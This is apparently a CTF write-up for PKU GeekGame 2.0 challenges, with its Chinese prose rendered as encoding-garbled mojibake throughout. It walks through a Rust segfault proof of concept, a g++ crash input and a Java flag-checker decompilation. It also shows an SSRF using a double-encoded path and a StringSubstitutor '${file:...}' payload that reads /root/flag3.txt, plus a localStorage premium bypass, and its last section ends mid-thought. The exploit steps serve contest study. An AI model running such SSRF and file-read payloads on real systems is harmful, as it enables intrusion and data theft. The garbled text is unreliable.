Googleæœç´¢`g++ huge error log`ï¼ŒæŸ¥çœ‹ç»“æœç¬¬ä¸€æ¡https://stackoverflow.com/questions/54004610/why-does-g-generate-huge-error-logã€‚å…¶ä¸­çš„ä»£ç å¯ä»¥ç”Ÿæˆ203KBçš„error logã€‚æ¥¼ä¸»æŒ‡å‡ºï¼š

> By repeating `(x` many times, the error log can grow into >1GB

æŒ‰ç…§ä¸Šè¿°æç¤ºï¼Œæ„é€ ä»¥ä¸‹ç¨‹åºå³å¯è¾¾åˆ°è¦æ±‚~~ï¼ˆè™½ç„¶æˆ‘å®Œå…¨ä¸çŸ¥é“åŸç†ï¼‰~~ï¼š

```c++
int main()
{
    struct x struct z<x(x(x(x(x(x(x(x(x(x(x(x(y,x(y><y*,x(y*w>v<y*,w,x{};
    return 0;
}
```

### ç©æŒºèŠ±

Googleæœç´¢`g++ crash`ï¼ŒæŸ¥çœ‹ç»“æœç¬¬ä¸€æ¡https://gcc.gnu.org/bugzilla/show_bug.cgi?id=54080ã€‚å…¶ä¸­çš„ä»£ç å¯ä»¥ä»¤g++å´©æºƒ~~ï¼ˆæˆ‘åŒæ ·ä¸çŸ¥é“åŸç†ï¼‰~~

## ç¼–åŸè¯‘ç†ä¹ é¢˜è¯¾ Â· å®éªŒç­

è™½ç„¶æˆ‘åœ¨ç¬¬äºŒé˜¶æ®µæ‰è§£å‡ºäº†è¿™é“é¢˜ç›®çš„Flag1ï¼Œä½†ç”±äºåŒæ ·é€šè¿‡æœç´¢å¼•æ“å†™å‡ºäº†è‡ªå·±ä¸ç†è§£çš„ä»£ç ï¼Œæˆ‘æŠŠå®ƒæ”¾åœ¨g++é¢˜çš„åé¢ã€‚

ç”±äºæˆ‘ä¸ä¼šRustï¼Œå†™å‡ºä¸€ä¸ªèƒ½è¢«å¹³å°æ¥å—çš„ç¨‹åºæµªè´¹äº†æˆ‘ä¸€äº›æ—¶é—´ã€‚ç›´åˆ°ç°åœ¨ï¼Œæˆ‘ä¹Ÿä¸æ˜ç™½ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬çš„ä»£ç ä¸åº”è¯¥å†™åœ¨`fn main()`å‡½æ•°ä¸­ï¼Œè€Œæ˜¯å†™åœ¨`pub fn run()`ä¸­ã€‚

ç†è§£äº†å¦‚ä½•è®©å¹³å°è¿è¡Œè‡ªå·±çš„ä»£ç åï¼Œæ ¹æ®[CVE List](https://github.com/Qwaz/rust-cve)é€‰å–ä¸€ä¸ªå°šæœªè¢«è§£å†³çš„[Unsoundæ¼æ´](https://github.com/rust-lang/rust/issues/85873)å³å¯é€ æˆæ®µé”™è¯¯ã€‚

```rust
#![forbid(unsafe_code)]
use std::{iter::Zip, marker::PhantomData, vec};

struct MyStruct<T>(PhantomData<T>);
impl<T> Clone for MyStruct<T> {
    fn clone(&self) -> Self {
        Self(PhantomData)
    }
}
impl Copy for MyStruct<fn(&())> {}

#[allow(clippy::type_complexity)]
pub fn run() {
    let i: vec::IntoIter<MyStruct<fn(&())>> = vec![MyStruct::<fn(&())>(PhantomData)].into_iter();
    let mut y = [Some(&42)];
    let mut z = i.zip(y.iter_mut());
    let r1 = z.next().unwrap().1;
    let mut z: Zip<vec::IntoIter<MyStruct<fn(&'static ())>>, _> = z;
    let r2 = z.next().unwrap().1;
    let elt = r1.as_ref().unwrap();
    dbg!(elt);
    *r2 = None;
    dbg!(elt);
}
```

## æ–¹ç¨‹ç»„

### Flag1

æŠŠæ–¹ç¨‹ç»„æ ¼å¼æ•´ç†ä¸€ä¸‹ï¼Œä¸¢åˆ°ç½‘é¡µç‰ˆåœ¨çº¿è§£æ–¹ç¨‹ï¼Œå†å››èˆäº”å…¥å–æ•´ä¸€ä¸‹è§£å‘é‡å³å¯å¾—åˆ°

![image-20221127184132920](README.assets/image-20221127184132920.png)

### Flag2

å˜å…ƒä¸ºæ•´æ•°ï¼Œå˜å…ƒçš„çº¿æ€§ç»„åˆå¾—å‡ºçš„å€¼ï¼Œä¸ç»™å‡ºçš„å€¼è¯¯å·®åœ¨ä¸€å®šèŒƒå›´å†…ã€‚è¿™ä»¤æˆ‘æƒ³åˆ°äº†**æ•´æ•°çº¿æ€§è§„åˆ’**é—®é¢˜

æˆ‘è°ƒæŸ¥åˆ°pythonçš„`pulp`åŒ…å¯ä»¥è§£å†³æ•´æ•°çº¿æ€§è§„åˆ’é—®é¢˜ã€‚ç„¶è€Œï¼Œè¯¥åŒ…çš„è¿ç®—ä½¿ç”¨äº†floatç±»å‹ï¼Œä¸é«˜ç²¾åº¦çš„Decimalè¿›è¡ŒåŠ å‡è¿ç®—ä¼šå‡ºé—®é¢˜ã€‚ä¸ºäº†ä½¿å®ƒæ”¯æŒDecimalï¼Œæˆ‘ä¿®æ”¹äº†å®ƒçš„æºç ï¼ŒæŠŠæ‰€æœ‰floatæ›¿æ¢ä¸ºDecimalã€‚

ä¹‹åï¼Œæ„é€ ä¸€ä¸ªæ•´æ•°çº¿æ€§è§„åˆ’é—®é¢˜ï¼Œå³å¯å¾—åˆ°flag2ï¼Œä»£ç å·²é™„åœ¨`equation`ç›®å½•.

## Flag Checker

å°†ä¸‹è½½çš„jaræ–‡ä»¶å¤åˆ¶åˆ°ä¸€ä¸ª`Intellij IDEA`é¡¹ç›®ä¸­ï¼Œå³é”®ä½œä¸ºåº“å¯¼å…¥ï¼Œå³å¯å®Œæˆå¯¹jarçš„åç¼–è¯‘ã€‚

### Flag1

åˆ†æ`actionPerformed`å‡½æ•°å¾—å¦‚ä¸‹æ•°æ®å…³ç³»
$flag1 \rarr utf8encode\rarr base64encode \rarr rot13 \rarr $ "MzkuM8gmZJ6jZJHgnaMuqy4lMKM4^"

ç»åˆ†æï¼Œ`rot13`åšä¸¤æ¬¡å³å¯æ¢å¤åŸçŠ¶ï¼Œå› æ­¤æˆ‘ä»¬é€†ç€ä¸Šé¢çš„å˜æ¢é“¾ï¼Œé€šè¿‡ä»¥ä¸‹ä»£ç æ¥æ¢å¤flag1

```java
static String getFlag1() {
    final byte[] var2 = Base64.getDecoder().decode(rot13("MzkuM8gmZJ6jZJHgnaMuqy4lMKM4"));
    return new String(var2);
}
```

### Flag2

æ£€æŸ¥Flag2æ—¶å®è´¨ä¸Šæ‰§è¡Œäº†`this.invocable.invokeFunction("checkflag2", input)`

æŸ¥çœ‹æ„é€ å‡½æ•°ï¼Œå‘ç°`this.invocable`è¢«èµ‹å€¼ä¸ºäº†ä¸€ä¸ª`ScriptEngine`å¯¹è±¡ã€‚è¯¥`ScriptEngine`é€šè¿‡`new ScriptEngineManager().getEngineByName("nashorn")`è·å¾—ã€‚ç»è¿‡æœç´¢ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªåœ¨Javaç¯å¢ƒä¸‹æ‰§è¡ŒJSè„šæœ¬çš„å¼•æ“ã€‚

`ScriptEngine`ä¸­å¡«å……çš„è„šæœ¬ç”±ä»¥ä¸‹ä»£ç ç”Ÿæˆï¼š

```java
String var4 = "ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†å¤ªé•¿äº†ï¼Œä¸ç²˜äº†ï¼‰";
StringBuilder var8 = new StringBuilder();

for(int var9 = 0; var9 < var4.length(); ++var9) {
    var8.append((char)(var4.charAt(var9) ^ 239));
}

var3.eval(var8.toString());
```

æˆ‘ä»¬å¤åˆ¶ä¸‹è¿™æ®µä»£ç ï¼Œè¾“å‡º`var8.toString()`ï¼Œå³å¯å¾—åˆ°è„šæœ¬æºç 

```javascript
function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}
```

è¿™å®åœ¨å¤ªä¸‘äº†ï¼Œæˆ‘ä»¬æŠŠæ•°ç»„`_0x724b`åšä¸€ä¸‹inlineï¼Œå†åˆ†ä¸€ä¸‹è¡Œï¼š

```js
function checkflag2(flag_json){
    return (
        JSON['stringify'](
            flag_json['split']('')['map'](
                function(x){
                    return x['charCodeAt'](0)
                }
            )
        ) == JSON['stringify'](
            [0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232]['map'](
                function(x) {
                    return (checkflag2+ '')['charCodeAt'](x)
                }
            )
        )?'Correct':'Wrong'
    )
}
```

`==`ä¸¤è¾¹éƒ½æ˜¯å­—èŠ‚æ•°ç»„ï¼Œå·¦è¾¹ç”±è¾“å…¥çš„flagç›´æ¥ç¼–ç å¾—åˆ°ï¼Œå› æ­¤å°†å³è¾¹çš„ç»“æœç¼–ç ä¸ºå­—ç¬¦ä¸²å³å¯å¾—åˆ°flag2ã€‚æˆ‘ä»¬æŠŠç­‰å·å³è¾¹çš„ä»£ç ä¸¢åˆ°æµè§ˆå™¨é‡Œæ‰§è¡Œä¸€ä¸‹ï¼Œå³å¯å¾—åˆ°`[102,108,97,103,123,106,97,118,97,115,99,114,105,112,116,45,111,98,102,117,115,99,97,116,111,114,125]`ï¼Œè¿›è€Œå¾—åˆ°flag

## æ™ºæ…§æ£€æµ‹å™¨

ä¸€å¼€å§‹ä»¥ä¸ºbugåœ¨GeekGameæ–°å†™çš„ä»£ç ä¸­ï¼Œæ²¡æƒ³åˆ°ä»–ä»¬æ˜¯çœŸçš„åœ¨ä¿®åŸæœ‰çš„bugã€‚

### ç©¿å¢™bug

åœ¨æºç çš„ç¬¬422è¡Œï¼Œè¿›è¡Œäº†ä¸€ä¸ªPythoné«˜å±æ“ä½œï¼šå°†ä¸€ä¸ªæ•°ç»„å˜é‡èµ‹å€¼ç»™å¦ä¸€ä¸ªæ•°ç»„å˜é‡ã€‚è¿™æ ·èµ‹å€¼ä¼šé€ æˆä¸¤ä¸ªå˜é‡åæŒ‡å‘åŒä¸€ä¸ªæ•°ç»„ã€‚

```python
CurPos = NewPos # line 422
```

åœ¨385è¡Œï¼Œ`NewPos = list(CurPos)`ä¼šå°†`NewPos`æŒ‡å‘ä¸€ä¸ªæ–°å»ºçš„æ•°ç»„ã€‚ç„¶è€Œï¼Œè¯¥æ“ä½œå¯¹äºæ¯è¡Œè¾“å…¥ä»…æ‰§è¡Œä¸€æ¬¡ï¼Œè€Œæ¯è¡Œè¾“å…¥ä¸­å¯ä»¥èµ°å¤šæ­¥ã€‚åœ¨ä¸€æ­¥èµ°å®Œä¹‹åï¼Œå¤„ç†ä¸‹ä¸€æ­¥æ—¶ï¼Œ`CurPos`å’Œ`NewPos`æŒ‡å‘äº†åŒä¸€ä¸ªæ•°ç»„ï¼Œå¯¹`NewPos`çš„ä»»ä½•ä¿®æ”¹éƒ½ä¼šååº”åˆ°`CurPos`ä¸Šã€‚

è€Œæˆ‘ä»¬æ³¨æ„åˆ°ï¼Œä»£ç 390~401è¡Œä¸­ï¼Œæ²¡æœ‰åšä»»ä½•æ£€æŸ¥åœ°ä¿®æ”¹äº†`NewPos`

```python
elif NewDirection == "N": # line 390
    NewPos[1] -= 1
elif NewDirection == "S":
    NewPos[1] += 1
elif NewDirection == "W":
    NewPos[2] -= 1
elif NewDirection == "E":
    NewPos[2] += 1
elif NewDirection == "U":
    NewPos[0] += 1
```

å› æ­¤ï¼Œå½“`CurPos`å’Œ`NewPos`æŒ‡å‘åŒä¸€æ•°ç»„æ—¶ï¼Œå³ä½¿ç§»åŠ¨åçš„`NewPos`è¢«åˆ¤å®šä¸ºéæ³•ä½ç½®ï¼Œ390~401è¡Œä¹Ÿå·²ç»ä½¿å¾—`CurPos`è¢«è®¾ç½®åˆ°è¯¥éæ³•ä½ç½®ã€‚åˆ©ç”¨è¯¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥æ¯æ¬¡è¾“å…¥ä¸¤ä¸ªæ“ä½œï¼Œä¸€ä¸ªåˆæ³•ç§»åŠ¨ä½¿å¾—422è¡Œè¢«æ‰§è¡Œï¼Œæ¥ä¸Šä¸€ä¸ªéæ³•ä½†å®é™…ä¼šç”Ÿæ•ˆçš„ç§»åŠ¨ã€‚

### ç ´åè€…

åˆ©ç”¨éæ³•ç§»åŠ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å½“å‰ä½ç½®çš„Zè½´åæ ‡å¤§äºå±‚æ•°ï¼Œä»è€Œè§¦å‘`IndexError`ã€‚æœ€å¿«è§¦å‘æ–¹æ³•æ˜¯åœ¨ç¬¬ä¸€å…³ä¸­ï¼Œä»»æ„é€‰æ‹©ä¸€ä¸ªå¯èµ°çš„æ–¹å‘ï¼Œå¹¶åŠ ä¸Šä¸€ä¸ªU

### è°ƒåœè€…

éæ³•ç§»åŠ¨çš„ä¸€ä¸ªç‰¹æ€§æ˜¯ä¸ä¼šæ¶ˆè€—æ­¥æ•°ã€‚æ‰€ä»¥99å›åˆç›¸å½“äºå¯ä»¥è¿›è¡Œ198æ¬¡ç§»åŠ¨ï¼Œè¿™äº›ç§»åŠ¨æ¬¡æ•°ç†è®ºä¸Šè¶³å¤Ÿä»åº•å±‚èµ°åˆ°æœ€é«˜å±‚ï¼Œä»å‡ºå‘è¾¹èµ°åˆ°ç»ˆç‚¹è¾¹ã€‚

è€ƒè™‘åˆ°ç«–ç›´æ–¹å‘ç§»åŠ¨æ­¥æ•°è¾ƒå¤šä¸”æ­£å¸¸ç§»åŠ¨çš„æœºä¼šè¾ƒå°‘ã€‚æˆ‘ä»¬ä¼˜å…ˆåˆ©ç”¨éæ³•æ“ä½œå‘ä¸Šèµ°ã€‚å‰ç½®çš„åˆæ³•æ“ä½œåˆ™ä¼˜å…ˆé€‰æ‹©èµ°å‘å¯¹è¾¹çš„æ°´å¹³ç§»åŠ¨ã€‚

ç”±äºæ‰‹ç©æ—¶ç»å¸¸è‚Œè‚‰è®°å¿†ä¸å°å¿ƒçˆ¬å¤ªå¤šå±‚ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨`pwntools`è‡ªåŠ¨èµ°åˆ°æœ€åä¸€å±‚ï¼Œåœ¨æœ€åä¸€å±‚æ°´å¹³ç§»åŠ¨æ—¶å†æ‰‹æ“ã€‚ç›¸å…³ä»£ç å·²é™„å¸¦åœ¨`maze`ç›®å½•

## ä¼é¹…æ–‡æ¡£

åˆ©ç”¨F12å¼€å‘è€…å·¥å…·ï¼Œæˆ‘åœ¨ä»¥ä¸‹ä¸¤ä¸ªè¯·æ±‚ä¸­å¾—åˆ°äº†æ‰€æœ‰è¢«éšè—çš„å•å…ƒæ ¼çš„å†…å®¹ã€‚

- https://docs.qq.com/dop-api/opendoc?tab=BB08J2&u=&noEscape=1&enableSmartsheetSplit=1&id=DV1lsUFRhQlp5eWtq&normal=1&outformat=1&startrow=0&endrow=60&wb=1&nowb=0&callback=clientVarsCallback&xsrf=de5a91f9324a7e98&t=1668924421378
- https://docs.qq.com/dop-api/get/sheet?padId=300000000%24WYlPTaBZyykj&subId=BB08J2&startrow=61&endrow=72&xsrf=de5a91f9324a7e98&_r=0.7895828440930863&outformat=1&normal=1&preview_token=&nowb=1&enableSmartsheetSplit=1&rev=23

å°†éšè—å•å…ƒæ ¼æ‹¼èµ·æ¥å¯ä»¥å¾—åˆ°ä¸€ä¸ªé“¾æ¥ã€‚è®¿é—®é“¾æ¥å¯ä»¥ä¸‹è½½åˆ°`challenge.har`

å°†`challenge.har`ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ï¼Œæœç´¢"Below is your flag"ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªjson

```json
{
	"0": {
		"0": 5,
		"2": [
			1,
			"Below is your flag"
		],
		"3": 0
	},
	"24": {
		"0": 1,
		"3": 1
	},
	"25": {
		"0": 1,
		"3": 1
	},
	...
}
```

ä¸æç¤ºä¸­çš„æ¶‚é»‘å•å…ƒæ ¼å¯¹æ¯”ï¼Œå‘ç°æ¯ä¸ªè¢«æ¶‚é»‘çš„å•å…ƒæ ¼éƒ½æœ‰å¯¹åº”çš„é”®ï¼Œå•å…ƒæ ¼çš„è¡Œå·åˆ—å·ä¸é”®çš„å…³ç³»ä¸º`key = row * 11 + col`ã€‚æ¯”å¦‚"25"å¯¹åº”çš„å°±æ˜¯ç¬¬2è¡Œç¬¬3åˆ—çš„æ ¼å­ã€‚

æå–ä¸Šè¿°`json`ï¼Œç”¨ä¸‹é¢ä»£ç å¯ä»¥ç”»å‡ºflag

```
import json
with open("challenge.json") as fj:
	data = json.load(fj)
for i in range(222):
	for j in range(11):
		x = i * 11 + j
		if str(x) in data:
			print("*",end="")
		else:
			print(" ",end="")
	print()
```

## ä¼ä¸šçº§ç†è§£

### èµ‹èƒ½ç®¡ç†åå°

æ ¹æ®ç¬¬äºŒé˜¶æ®µæç¤ºï¼Œè®¿é—®`https://prob08-xxxxxxxx.geekgame.pku.edu.cn/admin/`å³å¯è¿›å…¥ç®¡ç†åå°ã€‚F12æŸ¥çœ‹è¯¥ç½‘é¡µçš„ä»£ç ï¼Œå‘ç°ç‚¹å‡»æŒ‰é’®ä¼šå‘`admin/query`å‘é€POSTè¯·æ±‚ã€‚ä½†ç›´æ¥åœ¨æµè§ˆå™¨ç‚¹å‡»æ—¶ï¼Œä¼šè¢«Spring Securityæ‹¦æˆªå¹¶é‡å®šå‘åˆ°ç™»å½•ç•Œé¢ã€‚ä½¿ç”¨Pythonæ„é€ POSTè¯·æ±‚ï¼Œå‘é€åˆ°`https://prob08-xxxxxxxx.geekgame.pku.edu.cn/admin/query/`ï¼Œå³å¯ç»•è¿‡æ‹¦æˆªã€‚

åˆ†åˆ«å°è¯•åœ¨Post Dataçš„Typeä¸­å¡«å…¥`PKU`,`PKUGame`å’Œ`PKU_GeekGame`ï¼Œåœ¨`PKU_GeekGame`çš„å“åº”ä¸­æ‰¾åˆ°äº†flag1

```html
<!DOCTYPE html>\n<html lang="en">\n
<head>\n
	<meta charset="utf-8">\n
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n
	<meta name="description" content="">\n
	<meta name="author" content="">\n <title>Admin</title>\n
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" rel="stylesheet"
		crossorigin="anonymous">\n
	<link href="https://getbootstrap.com/docs/4.0/examples/signin/signin.css" rel="stylesheet"
		crossorigin="anonymous" />\n
</head>\n

<body>\n<div class="container">\n <form class="form-signin" method="post" action="/admin/query">\n <h2
				class="form-signin-heading">PKU GeekGame 2.0</h2>\n <p>\n <select name="type"
					class="custom-select d-block w-100" placeholder="\xe8\xaf\xb7\xe9\x80\x89\xe6\x8b\xa9" required
					autofocus>\n <option value="none" selected disabled hidden>
						\xe8\xaf\xb7\xe9\x80\x89\xe6\x8b\xa9\xe9\x80\x89\xe9\xa1\xb9</option>\n <option value="PKU"
						name="type">PKU</option>\n <option value="PKUGame" name="type">PKUGame</option>\n <option
						value="PKU_GeekGame" name="type" selected="selected">PKU_GeekGame</option>
					</option>\n </select>\n </p>\n <p>\n <label for="value" class="sr-only">Value</label>\n <input
					type="text" id="value" class="form-control" placeholder="Value" required autofocus name="value"
					value="{&quot;type&quot;:&quot;PKU_GeekGame&quot;,&quot;value&quot;:&quot;flag1{8a97cd0b-adec-4e63-bd46-3e6c60ea9d78} \xe6\x81\xad\xe5\x96\x9c\xe4\xbd\xa0\xe5\x8f\x91\xe7\x8e\xb0flag1\xef\xbc\x8c\xe8\xbf\x98\xe6\x9c\x89\xe5\x85\xb6\xe4\xbb\x96flag\xe7\xad\x89\xe5\xbe\x85\xe4\xbd\xa0\xe5\x8f\x91\xe7\x8e\xb0\xe5\x93\xa6&quot;}">\n
			</p>\n <button class="btn btn-lg btn-primary btn-block" type="submit">Click</button>\n </form>\n
		<!--  <p> Source Code Backup: /admin/source_bak </p>-->\n
	</div>\n</body>\n
</html>
```

### ç›˜æ´»ä¸šåŠ¡å¢é•¿

è®¿é—®`https://prob08-xxxxxxxx.geekgame.pku.edu.cn/admin/source_bak/`å³å¯è·å¾—`/admin`åç«¯çš„æºç 

```java
import org.springframework.web.reactive.function.client.WebClient;

@RestController
public class AdminController {
	WebClient webClient = WebClient.builder().baseUrl("http://localhost:8079/").build();

	@RequestMapping("/admin/{index}")
	public String adminIndex(@PathVariable(name = "index") String index, String auth, QueryBean queryBean) {
		if (index != null & index.contains("%")) {
			index = URLDecoder.decode(index, "UTF-8");
		}
		if (queryBean.getType() == null) {
			queryBean.setType("PKU");
		}
		if (!typeList.contains(queryBean.getType())) {
			typeList.add(queryBean.getType());
		}
		Mono str = webClient.post().uri(index).header(HttpHeaders.AUTHORIZATION, auth)
				.body(BodyInserters.fromFormData("type", queryBean.getType())).retrieve().bodyToMono(String.class);
		return queryBean.setValue(str.block());
	}
}
```

å‘ç°åœ¨`/admin/`åé¢åŠ ä¸Šä¸€ä¸²ä¸å«`/`çš„å­—ç¬¦ä¸²ï¼Œå³å¯ä»¥`http://localhost:8079/`ä¸º`baseUrl`è®¿é—®è¯¥å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ã€‚æ ¹æ®æç¤ºï¼Œæˆ‘ä»¬éœ€è¦è®¿é—®bonusæœåŠ¡ï¼Œå› æ­¤åœ¨æµè§ˆå™¨ä¸­è®¿é—®`https://prob08-xxxxxxxx.geekgame.pku.edu.cn/admin/localhost:8080`

å¯ä»¥çœ‹åˆ°ä¸€æ¡ä¿¡æ¯ï¼š

```
Endpoints:
/bonus
/source_bak
```

çœ‹æ¥æˆ‘ä»¬éœ€è¦è®¿é—®`localhost:8080/bonus`å’Œ`localhost:8080/source_bak`ã€‚ä½†æ˜¯è¿™é‡ŒåŠ ä¸Šæ–œæ çš„è¯ï¼Œè¯·æ±‚å°±æ— æ³•è¢«`AdminController`åŒ¹é…åˆ°ã€‚æ³¨æ„åˆ°åç«¯ä»£ç ä¸­ä½¿ç”¨äº†`URLDecoder`ï¼Œæˆ‘ä»¬åªéœ€è¦å°†`localhost:8080%2fbonus`ä¼ å…¥å³å¯ã€‚`%2f`ä¼šåœ¨æµè§ˆå™¨ä¸­è¢«è§£ç ï¼Œå› æ­¤æˆ‘ä»¬å¯¹ç™¾åˆ†å·å†è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œç¡®ä¿åç«¯æ”¶åˆ°çš„å­—ç¬¦ä¸²ä¸­å«æœ‰ç™¾åˆ†å·ã€‚æµè§ˆå™¨è®¿é—®`https://prob08-xxxxxxxx.geekgame.pku.edu.cn/admin/localhost:8080%252fbonus`ï¼Œå¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š

```
{"type":"Bonus","value":"flag2{f2d9cc00-180b-404d-8117-d2e712c2e57b} æ­å–œä½ å‘ç°flag2ï¼Œè¿˜æœ‰å…¶ä»–flagç­‰å¾…ä½ å‘ç°å“¦"}
```

### æ‰“é€šæ•´ä¸ªç³»ç»Ÿ

ç”¨è·å¾—flag2çš„æ–¹æ³•è®¿é—®`https://prob08-xxxxxxxx.geekgame.pku.edu.cn/admin/localhost:8080%252fsource_bak`ï¼Œå¯ä»¥å¾—åˆ°`/bonus`çš„åç«¯ä»£ç 

```java
import org.apache.commons.text.StringSubstitutor;

@RestControllerpublic
class BonusController {
	@RequestMapping("/bonus")
	public QueryBean bonus(QueryBean queryBean) {
		if (queryBean.getType().equals("CommonsText")) {
			StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
			interpolator.setEnableSubstitutionInVariables(true);
			String value = replaceUnSafeWord(queryBean.getValue());
			String resultValue = interpolator.replace(value);
			queryBean.setValue(resultValue);
		} else {
			// flag3è—åœ¨/root/flag3.txtç­‰å¾…ä½ å‘ç°
		}
		return queryBean;
	}
    // Leo_hï¼šè¿™é‡Œè¿˜æœ‰ä¸€æ®µåˆ é™¤æ¶æ„è„šæœ¬çš„ä»£ç ï¼Œä½†æˆ‘å®Œå…¨æ²¡æœ‰å¿…è¦ç»•è¿‡å®ƒï¼Œå°±ä¸ç²˜è¿‡æ¥äº†
}
```

è™½ç„¶æ²¡æœ‰æä¾›`QueryBean`ç±»çš„å®šä¹‰ï¼Œä½†å¯ä»¥çœ‹åˆ°å®ƒæœ‰`getType`å’Œ`getValue`ä¸¤ä¸ªæ–¹æ³•ã€‚ç»“åˆç®¡ç†åå°çš„è¡¨å•é¡¹ï¼Œå¯ä»¥çŒœæµ‹å‡ºè¿™å°±æ˜¯æˆ‘ä»¬POSTçš„è¡¨å•ã€‚

æ ¹æ®`CVE-2022-42889`ï¼Œæˆ‘ä»¬å‘ç°`commons.text.StringSubstitutor`æ˜¯å¥½ä¸œè¥¿ã€‚æˆ‘æŸ¥äº†ä¸€ä¸‹å®ƒçš„ç”¨æ³•ï¼Œå‘ç°å®ƒå…·æœ‰è¯»æ–‡ä»¶çš„åŠŸèƒ½ã€‚

å› æ­¤ï¼Œå°†POST Dataçš„`value`è®¾ç½®ä¸º`${file:utf-8:/root/flag3.txt}`å³å¯è¯»å–åˆ°flag3

```python
import requests
index = "localhost:8080%252fbonus"
url = f"https://prob08-xxxxxxxx.geekgame.pku.edu.cn/admin/{index}/"
rce = "${file:utf-8:/root/flag3.txt}"
resp = requests.post(url,data={"type":"CommonsText","value":rce})
print(resp.content.decode("utf-8"))
```

~~å’¦ï¼Œæˆ‘å¥½åƒæ ¹æœ¬æ²¡ç”¨åˆ°CVE-2022-42889å•Š~~

## è¿™ä¹Ÿèƒ½å·-Flag1

åœ¨ç½‘é¡µç¯å¢ƒä¸­æŒ‰F12ï¼Œé€‰æ‹©æºä»£ç æ ‡ç­¾ï¼ŒæŸ¥çœ‹`main.js`çš„ä»£ç ï¼Œå‘ç°åˆ¤æ–­ä¼šå‘˜æ˜¯é€šè¿‡`localStorage.getItem('i_am_premium_user') === 'true'`å®ç°çš„

åœ¨ç½‘é¡µæ§åˆ¶å°ä¸­è¾“å…¥`localStorage.setItem('i_am_premium_user','true')`å³å¯æˆä¸ºä¼šå‘˜ï¼Œæ­¤æ—¶è®¿é—®Premiumç•Œé¢å³å¯è·å¾—flag1

## 381654729

æœç´¢å¹¶æŒ‰ä½å‰ªæï¼ŒæŒ‰è§£ç åæ˜¯å¦èƒ½å¾—åˆ°ASCIIå­—ç¬¦ä¸²ç­›é€‰

```python
def search(clen,val):
	bt = (val ^ 2511413510787461249559068661325070136171729934109381260690).to_bytes(24,"big")
	if len(set(bt)-set(range(127))) <= 0:
		print(bt)
		exit()
	if clen > 48:
		return
	for cur in range(16):
		ftr = 16 * val + cur
		if ftr % clen == 0:
			search(clen+1,ftr)
search(1,0)
```

ç†è®ºä¸Šé™å®šå‰5ä½ä¸º`flag{`å¯ä»¥å‰ªæ‰æ›´å¤šçš„æï¼Œä½†åœ¨æˆ‘å®Œæˆè¿™ä¸ªä¼˜åŒ–ä¹‹å‰ï¼Œä¸Šé¢çš„ä»£ç å·²ç»è·‘å®Œäº†ã€‚

## ä¹±ç è¿˜åŸ

### è§‚å¯Ÿ

é¦–å…ˆæ‰“å°äº†ä¸€ä¸‹ä½›è¯­ä¸­å­—ç¬¦çš„UTF-8ç¼–ç å€¼ï¼Œå‘ç°ä¸€ä¸ªç‰¹ç‚¹ï¼šæ‰€æœ‰å­—ç¬¦éƒ½ç”±3ä¸ªå­—èŠ‚ç¼–ç ã€‚å› æ­¤æ ¹æ®UTF-8æ ‡å‡†ï¼Œæ‰€æœ‰å­—ç¬¦çš„ç¼–ç çš„å‰å››ä¸ªbitéƒ½æ˜¯1110ã€‚

æƒ³åˆ°å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œåœ¨ä¸¢å¤±äº†éƒ¨åˆ†å­—èŠ‚çš„å­—èŠ‚æ•°ç»„ä¸­ï¼Œé”šå®šæ¯ä¸ªä½›è¯­å­—ç¬¦çš„èµ·å§‹ä½ç½®ã€‚

ç”±äº`shift-jis`ç¼–ç ä¸­æ¯ä¸ªå­—ç¬¦ä¸º1~2å­—èŠ‚ï¼Œä¸¢å¤±å­—èŠ‚xçš„æƒ…å†µåªæœ‰ä»¥ä¸‹ä¸¤ç§ï¼š

- å­—èŠ‚xæ—¢ä¸èƒ½è§£ç æˆ`shift-jis`ä¸­çš„å•å­—èŠ‚å­—ç¬¦ï¼Œåˆä¸èƒ½ä½œä¸ºåŒå­—èŠ‚å­—ç¬¦çš„ç¬¬ä¸€ä¸ªå­—èŠ‚
- å­—èŠ‚xè¢«å½“åš`shift-jis`ä¸­çš„åŒå­—èŠ‚å­—ç¬¦çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œä½†åé¢è·Ÿç€çš„å­—èŠ‚yæ— æ³•ä¸å®ƒç»„æˆä¸€ä¸ªæœ‰æ•ˆçš„åŒå­—èŠ‚å­—ç¬¦xy

å› æ­¤ï¼Œè‹¥ä½›è¯­å­—ç¬¦çš„UTF-8ç¼–ç çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¼šä¸¢å¤±ï¼Œåˆ™å¯¹è¯¥å­—ç¬¦UTF-8ç¼–ç çš„å‰ä¸¤ä¸ªå­—èŠ‚è§£ç ä¸º`shift-jis`ï¼Œä¸€å®šèƒ½å¤ç°ä¸¢å¤±çš„æƒ…å†µã€‚ç»è¿‡éªŒè¯ï¼Œé™¤äº†â€œï¼šâ€å¤–ï¼Œæ‰€æœ‰ä½›è¯­å­—ç¬¦éƒ½æ²¡æœ‰å‡ºç°ä¸Šè¿°æƒ…å†µï¼š
